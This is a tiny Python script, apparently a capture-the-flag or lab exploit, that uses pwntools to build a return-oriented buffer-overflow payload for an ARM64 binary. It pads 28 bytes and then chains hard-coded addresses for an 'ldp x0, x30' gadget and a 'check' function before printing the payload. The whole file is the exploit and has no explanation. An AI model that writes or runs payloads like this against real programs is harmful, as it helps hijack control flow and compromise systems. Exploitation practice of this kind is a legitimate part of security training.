from subprocess import check_call
from pwn import *


ldp_x0_x30 = p64(0x10000059C)
check = p64(0x100000554)
lol = p64(0x100008000)


p = b"A"*28 + ldp_x0_x30 + lol + check

print(p)
